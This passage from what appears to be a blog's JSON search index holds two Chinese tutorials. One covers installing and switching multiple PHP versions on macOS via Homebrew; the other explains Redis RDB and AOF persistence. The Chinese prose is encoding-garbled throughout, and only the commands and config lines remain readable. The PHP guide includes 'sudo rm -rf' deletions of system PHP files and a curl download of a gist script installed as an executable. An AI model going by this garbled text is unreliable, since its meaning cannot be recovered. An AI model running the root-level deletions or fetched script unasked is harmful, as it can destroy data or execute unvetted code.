A();$server-&gt;on(&quot;open&quot;, [$obj, &quot;onOpen&quot;]);","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"å¦‚ä½•åœ¨ Mac OS ä¸Šå®‰è£…å¤šç‰ˆæœ¬çš„ PHP","slug":"how-to-install-multiple-versions-of-php-on-mac-os","date":"2020-11-24T15:42:11.000Z","updated":"2022-03-11T01:21:50.967Z","comments":true,"path":"how-to-install-multiple-versions-of-php-on-mac-os/","link":"","permalink":"https://www.0x2beace.com/how-to-install-multiple-versions-of-php-on-mac-os/","excerpt":"","text":"æœ€è¿‘åœ¨Mac ä¸Šåšå¼€å‘ï¼Œèµ·åˆåœ¨æ­å»ºç¯å¢ƒæ—¶ é‡åˆ°äº†éƒ¨åˆ†é—®é¢˜ï¼ŒåŠ ä¸ŠMac é¢„è£…çš„é‚£ä¸ªPHP ç‰ˆæœ¬ï¼Œå®åœ¨æ˜¯ä¸å¥½ç”¨ï¼Œphp-fpm æ€»æ˜¯å¯ä¸åŠ¨ï¼Œæœ€åç´¢æ€§å†³å®šåœ¨æœ¬åœ°è‡ªå·±è£…ä¸ªå¤šç‰ˆæœ¬ï¼Œå¯ä»¥éšæ—¶è‡ªç”±åˆ‡æ¢ã€‚ æ˜¯å¦éœ€è¦æ¸…é™¤æ—§ç‰ˆæœ¬ï¼Ÿ å› ä¸ºéœ€è¦åœ¨Mac ä¸Šå®‰è£…å…¶ä»–ç‰ˆæœ¬ï¼Œæ‰€ä»¥é¢„è£…çš„é‚£ä¸ªç‰ˆæœ¬çš„PHP çš„å­˜åœ¨å°±æ²¡å•¥æ„ä¹‰äº†ã€‚è€ƒè™‘åˆ°æœ¬æœºçš„å…¶ä»–è½¯ä»¶å¯èƒ½ä¼šä¾èµ–å®ƒï¼Œä¸ºäº†ç»™ä»¥åçœäº›äº‹ï¼Œæœ€åè¿˜æ˜¯å†³å®šå°†é¢„è£…çš„ç‰ˆæœ¬ç»™ç§»é™¤æ‰ã€‚ äº‹å®è¯æ˜ç§»é™¤äº†ä¹Ÿæ²¡å…³ç³»ã€‚ ç§»é™¤æ—§ç‰ˆæœ¬è¿™é‡Œè¯´çš„æ—§ç‰ˆæœ¬æŒ‡çš„æ˜¯Mac è‡ªå¸¦çš„PHPç‰ˆæœ¬ã€‚ 123456789101112# &#x2F;private&#x2F;etc&#x2F;$ sudo rm -rfi php-fpm.conf.default php-fpm.conf php.ini.default php-fpm.d&#x2F;# &#x2F;usr&#x2F;bin&#x2F;$ sudo rm -rfi php php-config phpize# &#x2F;usr&#x2F;lib&#x2F;$ sudo rm -rf php&#x2F;# &#x2F;usr&#x2F;sbin&#x2F;$ sudo rm -rf php-fpm# &#x2F;usr&#x2F;share&#x2F;$ sudo rm -rf php# &#x2F;usr&#x2F;share&#x2F;man&#x2F;man1&#x2F;$ sudo rm -rf php-config.1 php.1 phpize.1 æ‰§è¡Œå®Œä¸Šé¢è¿™äº›å‘½ä»¤å°±èƒ½å°†æ—§ç‰ˆæœ¬çš„PHP å½»åº•çš„ä»ä½ çš„Mac ä¸Šç§»é™¤äº†ã€‚ å®‰è£…å¤šç‰ˆæœ¬ç›´åˆ°2018å¹´3æœˆåº•ï¼Œæ‰€æœ‰PHP ç›¸å…³çš„brew éƒ½ç”± homebrew/php tab å¤„ç†ï¼Œä½†æ˜¯å·²ç»å¼ƒç”¨äº†ï¼Œæ‰€ä»¥ç°åœ¨æˆ‘ä»¬ä½¿ç”¨homebrew/coreåŒ…ä¸­çš„å¯ç”¨çš„å†…å®¹ã€‚è¿™åº”è¯¥æ˜¯ä¸€ä¸ªæ›´å¥½ç»´æŠ¤ä½†æ˜¯ä¸å¤ªå®Œæ•´çš„åŒ…ã€‚ ç”±äºPHP5.6å’ŒPHP7.0åœ¨ Homebrew ä¸Šå·²è¢«å¼ƒç”¨ï¼Œå› ä¸ºä»¥ä¸è¢«æ”¯æŒï¼Œè™½ç„¶ä¸å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œä½†è¿˜æ˜¯å¯ä»¥åœ¨å¼€å‘ç¯å¢ƒä¸­ä½¿ç”¨è¿™äº›ä¸å—æ”¯æŒçš„ç‰ˆæœ¬ï¼Œå¯ä»¥å‚è€ƒï¼šPHPæ”¯æŒçš„ç‰ˆæœ¬ã€‚ è¯·è®°ä½ï¼ŒHomebrew æ­£å¼æ”¯æŒPHP7.1 åˆ° 7.3 ï¼Œå› æ­¤å¦‚æœè¦å®‰è£… PHP5.6æˆ–PHP7.0ï¼Œåˆ™éœ€è¦æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 12345$ brew tap shivammathur&#x2F;phpUpdating Homebrew...&#x3D;&#x3D;&gt; Auto-updated Homebrew!Updated 1 tap (homebrew&#x2F;core).â€¦â€¦ æ¥ä¸‹æ¥æ­£å¼å¼€å§‹å®‰è£…PHP çš„å„ç§ç‰ˆæœ¬ï¼Œå¹¶ä½¿ç”¨ç®€å•çš„è„šæœ¬æ¥è¿›è¡Œç‰ˆæœ¬ä¹‹é—´çš„åˆ‡æ¢ã€‚ 12345$ brew install shivammathur&#x2F;php&#x2F;php@5.6$ brew install shivammathur&#x2F;php&#x2F;php@7.0$ brew install shivammathur&#x2F;php&#x2F;php@7.1$ brew install shivammathur&#x2F;php&#x2F;php@7.2$ brew install shivammathur&#x2F;php&#x2F;php@7.3 ç¬¬ä¸€ä¸ªå®‰è£…æ‰€èŠ±è´¹çš„æ—¶é—´é•¿ä¸€äº›ï¼Œå› ä¸ºéœ€è¦å®‰è£…ä¸€å †brew çš„ä¾èµ–ï¼Œéšåå…¶ä»–ç‰ˆæœ¬çš„å®‰è£…çš„å°†å¾ˆå¿«ã€‚ æ‰€å®‰è£…å„ç‰ˆæœ¬çš„PHPéƒ½åœ¨è¯¥ç›®å½•ä¸‹ï¼š 12345$ ls &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php5.6 7.0 7.1 7.2 7.3# php.ini é…ç½®æ–‡ä»¶ç›®å½•&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;x.x&#x2F;php.ini å®‰è£…å®Œä»¥ä¸Šç‰ˆæœ¬çš„PHP ä¹‹åï¼Œæ‰§è¡Œï¼š 12345$ php -v PHP 7.3.5 (cli) (built: May 2 2019 12:40:36) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.3.5, Copyright (c) 1998-2018 Zend Technologies with Zend OPcache v7.3.5, Copyright (c) 1999-2018, by Zend Technologies å¯ä»¥çœ‹åˆ°ç›®å‰æ‰€ä½¿ç”¨çš„PHP ç‰ˆæœ¬æ˜¯7.3ï¼ˆæœ€åå®‰è£…å®Œçš„é‚£ä¸ªï¼‰ï¼Œç°åœ¨è¯•å›¾åˆ‡æ¢åˆ°ç¬¬ä¸€ä¸ªå®‰è£…çš„PHP ç‰ˆæœ¬ï¼š 1$ brew unlink php@7.3 &amp;&amp; brew link --force --overwrite php@5.6 unlick å®‰è£…PHP ç‰ˆæœ¬ä¹‹é—´ä¸å†éœ€è¦è”ç³»ï¼Œå› ä¸ºé»˜è®¤æƒ…å†µä¸‹ä»–ä»¬æ˜¯æ²¡æœ‰ç¬¦å·é“¾æ¥ã€‚ å†æ¬¡æŸ¥çœ‹å½“å‰ç‰ˆæœ¬ï¼š 12345$ php -vPHP 5.6.40 (cli) (built: Apr 23 2019 11:14:34)Copyright (c) 1997-2016 The PHP GroupZend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies åˆ‡æ¢çš„æŒºé¡ºåˆ©çš„ï¼Œä½†å¦‚æœæ¯æ¬¡éœ€è¦åˆ‡æ¢æ—¶éƒ½éœ€è¦è¿™æ ·è¾“å…¥å°±å˜å¾—å¾ˆéº»çƒ¦äº†ï¼Œå¹¸è¿çš„æ˜¯ï¼Œä¸€äº›å‹¤åŠ³çš„äººå·²ç»ä¸ºæˆ‘ä»¬å®Œæˆäº†è‰°è‹¦çš„å·¥ä½œï¼Œå¹¶ç¼–å†™äº†ä¸€ä¸ªéå¸¸æ–¹ä¾¿çš„è„šæœ¬â€”â€”PHPåˆ‡æ¢å™¨è„šæœ¬ã€‚ å°†sphpè„šæœ¬å®‰è£…åˆ° brew çš„æ ‡å‡†ä¸­/usr/local/binï¼š 12$ curl -L https:&#x2F;&#x2F;gist.githubusercontent.com&#x2F;rhukster&#x2F;f4c04f1bf59e0b74e335ee5d186a98e2&#x2F;raw &gt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sphp$ chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sphp å¤šç‰ˆæœ¬åˆ‡æ¢å®Œæˆè¿™äº›æ­¥éª¤åï¼Œå°±èƒ½å¤Ÿä½¿ç”¨è„šæœ¬å‘½ä»¤åˆ‡æ¢PHPç‰ˆæœ¬ï¼š 1$ sphp 7.2 ä½¿ç”¨æ—¶ä¼šéœ€è¦æä¾›ç®¡ç†å‘˜å¯†ç ï¼Œç›¸æ¯”é•¿é•¿çš„å‘½ä»¤è¿™å·²ç»çœäº‹å¾ˆå¤šäº†ã€‚ å¥½äº†ï¼Œåˆ°è¿™é‡Œå°±é¡ºåˆ©çš„å®Œæˆäº†å¤šç‰ˆæœ¬çš„PHP å®‰è£…ä»¥åŠåˆ‡æ¢ã€‚ ç®¡ç† PHP æœåŠ¡åœ¨ä¸éœ€è¦åˆ‡æ¢ç‰ˆæœ¬æ—¶ï¼Œä½¿ç”¨brew serviceså‘½ä»¤å¯ä»¥å¯¹è¯¥ç‰ˆæœ¬çš„PHP è¿›è¡Œç®¡ç†ï¼š å¯åŠ¨/åœæ­¢/é‡å¯ PHPæœåŠ¡ï¼š 1$ brew services start&#x2F;stop&#x2F;restart php å½“PHP æœåŠ¡å¯åŠ¨æ—¶ï¼Œé€šè¿‡æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨ï¼Œå¯ä»¥å‘ç°å¤šäº†å‡ ä¸ªåä¸ºphp-fpm çš„è¿›ç¨‹ã€‚ php-fpmçš„è¿›ç¨‹æ‰€åœ¨ç›®å½•ï¼š/usr/local/opt/php/sbin/php-fpm è¿™ä¸ªè¿›ç¨‹å¾ˆé‡è¦ï¼Œåœ¨ä¸ Nginx äº¤äº’æ—¶ï¼Œå¦‚æœæ²¡æœ‰å¯åŠ¨å®ƒï¼Œé€šå¸¸ä¼šæ”¶åˆ° 502 Bad Gateway çš„é”™è¯¯ã€‚ å°½ç®¡ä¸éœ€è¦åˆ»æ„çš„å»ç®¡ç†è¿™ä¸ªè¿›ç¨‹ï¼Œä½†å¦‚æœè¿™ä¸ªè¿›ç¨‹æ„å¤–åœæ­¢è¿è¡Œäº†ï¼Œè¿˜æ˜¯è¦çŸ¥é“è¯¥å¦‚ä½•å¯åŠ¨å®ƒã€‚ å‰å°å¯åŠ¨12$ cd &#x2F;usr&#x2F;local&#x2F;opt&#x2F;php&#x2F;sbin&#x2F;$ .&#x2F;php-fpm ç”¨è¿™ç§æ–¹å¼å¯åŠ¨ï¼Œå½“ä½¿ç”¨âŒƒ Cé€€å‡ºæ—¶ï¼Œè¿›ç¨‹ä¹Ÿä¼šè·Ÿç€é€€å‡ºã€‚ åå°å¯åŠ¨12# &#x2F;usr&#x2F;local&#x2F;opt&#x2F;php&#x2F;sbin&#x2F;$ .&#x2F;php-fpm &amp; å¦‚æœç”¨è¿™ç§æ–¹å¼å¯åŠ¨ï¼Œå°±ç®—é€€å‡ºäº†å½“å‰ä¼šè¯ï¼Œè¿›ç¨‹ä¼šä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œç€ã€‚ æ£€æŸ¥PHP ç‰ˆæœ¬æœ€åå†å•°å—¦ä¸¤å¥ï¼Œå¦‚æœéœ€è¦æŠŠå½“å‰5.6ç‰ˆæœ¬åˆ‡æ¢æˆ7.2ï¼Œé‚£ä¹ˆéœ€è¦åˆ†åˆ«åšä¸¤ä»¶äº‹ï¼š 123456# ç¬¬ä¸€æ­¥$ sphp 7.2# ç¬¬äºŒæ­¥$ brew services stop php@5.6$ brew services start php@7.2 å¦‚æœåªåšäº†ç¬¬ä¸€æ­¥ï¼Œé‚£ä¹ˆä½ ä¼šå‘ç° php -vçš„ç‰ˆæœ¬è¾“å‡ºçš„ç¡®æ˜¯ 7.2ï¼Œä½†php_info()æ‰€æ‰“å°çš„ç»“æœå´è¿˜æ˜¯ 5.6ã€‚ è¿™æ˜¯å› ä¸ºæœºå™¨ä¸Šå®‰è£…äº†å¤šä¸ªPHP ç‰ˆæœ¬ï¼Œå½“ä½¿ç”¨php -vå‘½ä»¤æ—¶ï¼Œå®ƒå°†æ˜¾ç¤ºé»˜è®¤PHP CLIçš„ç‰ˆæœ¬ï¼Œè€Œè¯¥ç‰ˆæœ¬å¯èƒ½ä¸æ˜¯ç½‘ç«™æ‰€ä½¿ç”¨çš„ç‰ˆæœ¬ã€‚ æ‰€ä»¥æ‰¾å‡ºç”¨äºç‰¹å®šç½‘ç«™çš„PHP ç‰ˆæœ¬çš„æœ€å¯é æ–¹æ³•æ˜¯ä½¿ç”¨phpinfo()å‡½æ•°ã€‚ php cli å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œä½†æ˜¯Web æœåŠ¡å´æ²¡æœ‰åŠæ³•è®¿é—®ï¼Œè¿™æ˜¯å› ä¸ºå®‰è£…äº†PHPï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œç›´æ¥è®¿é—®ï¼Œä½†æ˜¯ php-fpm å´æ²¡æœ‰å¯åŠ¨ï¼Œæ‰€ä»¥Web æœåŠ¡æ²¡æ³•æ­£å¸¸è®¿é—®ã€‚ å¯åŠ¨Web æœåŠ¡ï¼š 12cd /usr/local/Cellar/php/8.1.1/sbin./php-fpm sphp è¿™ä¸ªè„šæœ¬æ‰€åšçš„äº‹æƒ…ç­‰äºä»¥ä¸‹å‘½ä»¤ï¼š 1$ brew unlink php@7.3 &amp;&amp; brew link --force --overwrite php@5.6 åªæ˜¯æ”¹å˜äº†å‘½ä»¤è¡Œçš„ç‰ˆæœ¬ï¼ŒWeb æœåŠ¡æœ€ç»ˆè¿˜æ˜¯è¦ä»¥å…è®¸çš„php-fpm ä¸ºå‡†ã€‚ å‚è€ƒé“¾æ¥ Mac ä¸‹ Nginxã€PHPã€MySQL å’Œ PHP-fpm çš„å®‰è£…å’Œé…ç½® å¦‚ä½•åœ¨Mac ä¸Šå®‰è£…å¤šç‰ˆæœ¬çš„PHP å¦‚ä½•å¸è½½Mac é¢„è£…çš„PHP å¦‚ä½•æ£€æŸ¥PHP ç‰ˆæœ¬ Error: php@7.3 has been disabled because it is a versioned formula!","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Redis æŒä¹…åŒ–å¿«é€Ÿä¸Šæ‰‹","slug":"redis-persistence-quick-start","date":"2020-11-21T11:05:31.000Z","updated":"2020-11-23T12:34:07.708Z","comments":true,"path":"redis-persistence-quick-start/","link":"","permalink":"https://www.0x2beace.com/redis-persistence-quick-start/","excerpt":"ä»€ä¹ˆæ˜¯æŒä¹…åŒ–ï¼Ÿ Redis æ‰€æœ‰æ•°æ®éƒ½æ˜¯å­˜å‚¨åœ¨å†…å­˜ä¸­çš„ï¼Œå¯¹äºæ•°æ®çš„æ›´æ–°å°†å¼‚æ­¥çš„ä¿å­˜åœ¨ç£ç›˜ä¸­ï¼Œå½“Rediså®ä¾‹é‡å¯æ—¶ï¼Œå³å¯åˆ©ç”¨ä¹‹å‰æŒä¹…åŒ–çš„æ–‡ä»¶å®ç°æ•°æ®æ¢å¤ã€‚","text":"ä»€ä¹ˆæ˜¯æŒä¹…åŒ–ï¼Ÿ Redis æ‰€æœ‰æ•°æ®éƒ½æ˜¯å­˜å‚¨åœ¨å†…å­˜ä¸­çš„ï¼Œå¯¹äºæ•°æ®çš„æ›´æ–°å°†å¼‚æ­¥çš„ä¿å­˜åœ¨ç£ç›˜ä¸­ï¼Œå½“Rediså®ä¾‹é‡å¯æ—¶ï¼Œå³å¯åˆ©ç”¨ä¹‹å‰æŒä¹…åŒ–çš„æ–‡ä»¶å®ç°æ•°æ®æ¢å¤ã€‚ ä¸»æµæ•°æ®åº“çš„æŒä¹…åŒ–æ–¹å¼ï¼š å¿«ç…§ Mysql dump Redis rdb æ—¥å¿— Mysql binlog Redis aof RDBä»€ä¹ˆæ˜¯RDBï¼ŸRedis é€šè¿‡ä¸€æ¡å‘½ä»¤æˆ–è€…æŸç§æ–¹å¼åˆ›å»º rdb æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ ¼å¼ï¼Œå­˜å‚¨åœ¨ç¡¬ç›˜ä¸­ã€‚ å½“éœ€è¦å¯¹Redis è¿›è¡Œæ¢å¤æ—¶ï¼Œå°±å¯ä»¥å»åŠ è½½è¯¥æ–‡ä»¶ã€‚æ•°æ®æ¢å¤çš„ç¨‹åº¦ï¼Œå–å†³äº rdbæ–‡ä»¶ï¼ˆå¿«ç…§ï¼‰äº§ç”Ÿçš„æ—¶åˆ»ã€‚ ä¸‰ç§è§¦å‘æœºåˆ¶Redis ç”Ÿæˆ rdb æ–‡ä»¶æœ‰ä¸‰ç§æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯ï¼š save bgsave è‡ªåŠ¨ç­–ç•¥ savesave å‘½ä»¤æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š åŒæ­¥é˜»å¡ æ–‡ä»¶ç­–ç•¥ï¼šå¦‚æœå­˜åœ¨æ—§çš„rdb æ–‡ä»¶ï¼Œåˆ™ä¼šæ›¿æ¢æˆæ–°çš„ å¤æ‚åº¦ï¼šOï¼ˆNï¼‰ bgsavebgsave å‘½ä»¤æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š å¼‚æ­¥éé˜»å¡ï¼ˆå‡ ä¹ä¸ä¼šé˜»å¡å®¢æˆ·ç«¯ï¼‰ æ–‡ä»¶ç­–ç•¥å’Œå¤æ‚åº¦åŒä¸Šã€‚ save è¿˜æ˜¯ bgsaveï¼Ÿ å‘½ä»¤ save bgsave IOç±»å‹ åŒæ­¥ å¼‚æ­¥ æ˜¯å¦é˜»å¡ æ˜¯ å¦ï¼ˆé˜»å¡å‘ç”Ÿåœ¨fork() å¤æ‚åº¦ O(n) O(n) ä¼˜ç‚¹ ä¸ä¼šæ¶ˆè€—é¢å¤–å†…å­˜ ä¸é˜»å¡å®¢æˆ·ç«¯ ç¼ºç‚¹ é˜»å¡å®¢æˆ·ç«¯ éœ€è¦forkï¼Œæ¶ˆè€—å†…å­˜ åœ¨æ•°æ®é‡ä¸å¤§çš„æƒ…å†µä¸‹ï¼Œå…¶å®ä½¿ç”¨save è¿˜æ˜¯bgsave å¹¶æ²¡æœ‰ä»€ä¹ˆå·®å¼‚ã€‚ å®ƒä¿©éƒ½æ˜¯éœ€è¦æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤æ‰ä¼šè§¦å‘æœºåˆ¶ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰è‡ªåŠ¨çš„æ–¹å¼å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ã€‚ è‡ªåŠ¨ç­–ç•¥è‡ªåŠ¨ç”Ÿæˆç­–ç•¥æ˜¯æ ¹æ®æŸä¸ªè§„åˆ™æ¥å†³å®šæ˜¯å¦ç”Ÿæˆ rdb æ–‡ä»¶ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¹Ÿæ˜¯ä¸€ä¸ªbgsave çš„è¿‡ç¨‹ã€‚ é»˜è®¤ç­–ç•¥ï¼š|seconds|changes||-|-||900|1||300|10||60|10000| ä¸Šè¿°é…ç½®çš„æ„æ€æ˜¯ï¼šå¦‚æœåœ¨60s ä¸­åšäº†10000 æ¬¡æ”¹å˜æˆ–è€…åœ¨ 300s ä¸­åšäº† 10æ¬¡ æ”¹å˜ï¼Œæˆ–è€…åœ¨900s ä¸­åšäº† 1 æ¬¡æ”¹å˜ï¼Œåˆ™å‡ä¼šè§¦å‘bgsaveã€‚ é…ç½®12345678#save 900 1#save 300 10 #save 60 10000dbfilename dump.rdb &#x2F;&#x2F; rdb æ–‡ä»¶åç§°dir &#x2F;big_disk_path &#x2F;&#x2F; å·¥ä½œç›®å½•stop-writes-on-bgsave-error yes &#x2F;&#x2F; å¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œåœæ­¢å†™å…¥rdbcompression yes &#x2F;&#x2F; é‡‡ç”¨å‹ç¼©æ ¼å¼ rdbchecksum yes &#x2F;&#x2F; å¯¹rdb æ–‡ä»¶è¿›è¡Œæ£€éªŒ è§¦å‘æœºåˆ¶Redis å½“è¾¾åˆ°ä»¥ä¸‹è§¦å‘æœºåˆ¶æ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨åˆ›å»ºrdb æ–‡ä»¶ã€‚ å…¨é‡å¤åˆ¶ debug reload showdown RDB æ–‡ä»¶æ¢å¤å‰é¢å·²ç»æåˆ°è¿‡äº†ï¼ŒæŒä¹…åŒ–çš„ç›®çš„æ˜¯ä¸ºäº†è§£å†³å†…å­˜å¼‚å¸¸å¯¼è‡´çš„æ•°æ®ä¸¢å¤±é—®é¢˜ï¼Œå¦‚æœçœŸçš„é‡åˆ°äº†è¿™æ ·çš„æƒ…å†µï¼ŒRDB æ–‡ä»¶åˆæ˜¯å¦‚ä½•å®ç°æ•°æ®æ¢å¤çš„å‘¢ï¼Ÿ å› ä¸ºå¼€å¯æŒä¹…åŒ–ä¹‹åï¼Œæ•°æ®ä¼šå­˜å‚¨åˆ°åä¸º dump.rdb çš„æ–‡ä»¶ä¸­ï¼Œå½“ Redis æœåŠ¡å™¨é‡å¯æ—¶ï¼Œæ£€æµ‹åˆ° dump.rdb æ–‡ä»¶åï¼Œå°±ä¼šè‡ªåŠ¨åŠ è½½è¿›è¡Œæ•°æ®æ¢å¤ã€‚ AOFåœ¨æ­£å¼ä»‹ç»ä»€ä¹ˆæ˜¯AOF ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹RDB æ–¹å¼ç°å­˜çš„é—®é¢˜ã€‚ è€—æ—¶ã€è€—æ€§èƒ½ ä¸å¯æ§ã€ä¸¢å¤±æ•°æ® ä»€ä¹ˆæ˜¯AOFï¼Ÿä¸RDB ä¸åŒçš„æ˜¯ï¼Œå®ƒæ˜¯é€šè¿‡ä¿å­˜æ‰€æ‰§è¡Œçš„å†™å‘½ä»¤æ¥å®ç°çš„ï¼Œå¹¶ä¸”ä¿å­˜çš„æ•°æ®æ ¼å¼æ˜¯å®¢æˆ·ç«¯å‘é€çš„å‘½ä»¤ã€‚ ä¸‰ç§ç­–ç•¥Redis åœ¨æ‰§è¡Œå†™å‘½ä»¤æ—¶ï¼Œé¦–å…ˆå†™å…¥ç¡¬ç›˜çš„ç¼“å†²åŒºï¼Œç¼“å†²åŒºä¼šæ ¹æ®ä»¥ä¸‹ä¸‰ç§ç­–ç•¥å»åˆ·æ–°åˆ°ç£ç›˜ä¸­ã€‚ alwaysï¼šæ¯æ¬¡å†™å…¥éƒ½æŠŠç¼“å†²åŒº fsync åˆ°ç¡¬ç›˜ï¼Œæ€§èƒ½å½±å“æœ€å¤§ï¼Œå ç”¨ç£ç›˜ IO è¾ƒé«˜ï¼Œæ•°æ®å®‰å…¨æ€§æœ€é«˜ã€‚ everysecï¼šæ¯ç§’æŠŠç¼“å†²åŒº fsync åˆ°ç¡¬ç›˜ï¼Œå¯¹æ€§èƒ½å½±å“ç›¸å¯¹è¾ƒå°ã€‚ noï¼šç”±ç³»ç»Ÿå†³å®šæ˜¯å¦ fsyncã€‚ always è¿˜æ˜¯ everysec è¿˜æ˜¯ noï¼Ÿ å‘½ä»¤ always everysec no ä¼˜ç‚¹ ä¸ä¸¢å¤±æ•°æ® æ¯ç§’ä¸€æ¬¡ fsync ä¸ç”¨ç®¡ ç¼ºç‚¹ IO å¼€é”€è¾ƒå¤§ï¼Œä¸€èˆ¬çš„sata ç›˜åªæœ‰å‡ ç™¾ TPS ä¸¢ä¸€ç§’æ•°æ® ä¸å¯æ§ AOF é‡å†™æ¥çœ‹è¿™æ ·ä¸€ç§æƒ…å†µï¼š 12345678910127.0.0.1:6379&gt; set name php OK127.0.0.1:6379&gt; set name cOK127.0.0.1:6379&gt; set name pythonOK127.0.0.1:6379&gt; set name jsOK127.0.0.1:6379&gt; get name &quot;js&quot; è™½ç„¶set äº†å¾ˆå¤šæ¬¡ï¼Œä½†æ˜¯name çš„å€¼ï¼Œåªå—æœ€åä¸€æ¬¡set çš„å½±å“ï¼Œæ‰€ä»¥å‰é¢é‚£ä¹ˆå¤šæ¬¡ï¼Œå…¶å®æ²¡æœ‰å¿…è¦ä¹Ÿä¿å­˜åˆ°AOF æ–‡ä»¶ä¸­ã€‚ æ»¡è¶³æ‰€è®¾ç½®çš„æ¡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘ AOF é‡å†™ï¼Œæ­¤æ—¶ Redis ä¼šæ‰«ææ•´ä¸ªå®ä¾‹çš„æ•°æ®ï¼Œé‡æ–°ç”Ÿæˆä¸€ä¸ª AOF æ–‡ä»¶æ¥è¾¾åˆ°ç˜¦èº«çš„æ•ˆæœã€‚ é…ç½®12345678910&#x2F;&#x2F; AOFappendonly yes &#x2F;&#x2F; å¼€å¯AOF ç­–ç•¥appendfilename &quot;appendonly-$&#123;port&#125;.aof&quot; &#x2F;&#x2F; aof æ–‡ä»¶åappendfsync everysec &#x2F;&#x2F; åˆ·æ–°ç­–ç•¥dir &#x2F;big_disk_path &#x2F;&#x2F; å·¥ä½œç›®å½•no-appendfsync-on-write yes &#x2F;&#x2F; AOF é‡å†™æ—¶ï¼Œæ˜¯å¦éœ€è¦åšAOF æ£€æµ‹æ“ä½œ&#x2F;&#x2F; AOF é‡å†™auto-aof-rewrite-percentage 100 &#x2F;&#x2F; AOF æ–‡ä»¶è·ç¦»ä¸Šæ¬¡æ–‡ä»¶å¢é•¿è¶…è¿‡å¤šå°‘ç™¾åˆ†æ¯”auto-aof-rewrite-min-size 64mb &#x2F;&#x2F; AOF æ–‡ä»¶ä½“ç§¯æœ€å°å¤šå¤§ä»¥ä¸Šè§¦å‘ AOF æ–‡ä»¶æ¢å¤ä¸ RBD æ–‡ä»¶ä¸åŒï¼Œå› ä¸ºAOF æ–‡ä»¶çš„æ•°æ®æ ¼å¼ï¼Œæ˜¯ç”±å‘½ä»¤ç»„æˆçš„ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯ç›´æ¥æ‰§è¡Œæ¯æ¡å‘½ä»¤å°±å¯ä»¥å°†æ•°æ®è¿›è¡Œæ¢å¤ã€‚ RDB è¿˜æ˜¯AOFï¼Ÿ RDB å’ŒAOF æœ‰å„è‡ªçš„ä¼˜ç¼ºç‚¹ï¼Œé‚£ä¹ˆåˆ°åº•è¯¥é€‰æ‹©å“ªä¸ªå‘¢ï¼Ÿ å¹¶æ²¡æœ‰ç»å¯¹æ­£ç¡®çš„ç­”æ¡ˆã€‚éœ€è¦æ ¹æ®å®é™…æƒ…å†µå»ä½œå–èˆï¼Œä¸è¿‡é€šå¸¸éƒ½æ˜¯ä½¿ç”¨æ··åˆæŒä¹…åŒ–çš„æ–¹å¼ã€‚ å‘½ä»¤ RDB AOF å¯åŠ¨ä¼˜å…ˆçº§ ä½ é«˜ ä½“ç§¯ å° å¤§ æ¢å¤é€Ÿåº¦ å¿« æ…¢ æ•°æ®å®‰å…¨æ€§ ä¸¢æ•°æ® æ ¹æ®ç­–ç•¥å†³å®š çº§åˆ« é‡ è½» æ··åˆæŒä¹…åŒ–æ··åˆæŒä¹…åŒ–æ˜¯é€šè¿‡ aof-use-rdb-preamble å‚æ•°æ¥å¼€å¯çš„ã€‚å®ƒçš„æ“ä½œæ–¹å¼æ˜¯è¿™æ ·çš„ï¼Œåœ¨å†™å…¥çš„æ—¶å€™å…ˆæŠŠæ•°æ®ä»¥ RDB çš„å½¢å¼å†™å…¥æ–‡ä»¶çš„å¼€å¤´ï¼Œå†å°†åç»­çš„å†™å‘½ä»¤ä»¥ AOF çš„æ ¼å¼è¿½åŠ åˆ°æ–‡ä»¶ä¸­ã€‚è¿™æ ·æ—¢èƒ½ä¿è¯æ•°æ®æ¢å¤æ—¶çš„é€Ÿåº¦ï¼ŒåŒæ—¶åˆèƒ½å‡å°‘æ•°æ®ä¸¢å¤±çš„é£é™©ã€‚ é‚£ä¹ˆæ··åˆæŒä¹…åŒ–ä¸­æ˜¯å¦‚ä½•æ¥è¿›è¡Œæ•°æ®æ¢å¤çš„å‘¢ï¼Ÿåœ¨ Redis é‡å¯æ—¶ï¼Œå…ˆåŠ è½½ RDB çš„å†…å®¹ï¼Œç„¶åå†é‡æ”¾å¢é‡ AOF æ ¼å¼å‘½ä»¤ã€‚è¿™æ ·å°±é¿å…äº† AOF æŒä¹…åŒ–æ—¶çš„å…¨é‡åŠ è½½ï¼Œä»è€Œä½¿åŠ è½½é€Ÿç‡å¾—åˆ°å¤§å¹…æå‡ã€‚ æ€»ç»“RDBæŒä¹…åŒ– 